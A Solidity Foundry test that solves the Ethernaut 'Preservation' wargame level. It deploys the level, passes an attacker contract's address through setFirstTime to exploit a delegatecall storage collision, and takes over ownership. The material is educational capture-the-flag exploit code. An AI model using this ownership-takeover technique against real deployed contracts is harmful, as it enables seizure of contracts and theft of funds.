// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import {Test, console2} from "forge-std/Test.sol";

import {Preservation} from "ethernaut/levels/Preservation.sol";
import {PreservationFactory} from "ethernaut/levels/PreservationFactory.sol";

import {PreservationAttacker} from "../src/Preservation/PreservationAttacker.sol";

contract DelegationTest is Test {
    PreservationFactory factory = new PreservationFactory();
    Preservation public victim;

    address public attacker = address(this);
    PreservationAttacker public attackContract;

    function setUp() public {
        victim = Preservation(factory.createInstance(attacker));

        attackContract = new PreservationAttacker(address(victim));
    }

    function testAttack() external {
        assertEq(victim.owner(), address(factory));

        victim.setFirstTime(uint160(address(attackContract)));

        victim.setFirstTime(uint160(attacker));

        assertTrue(factory.validateInstance(payable(address(victim)), attacker));
    }
}
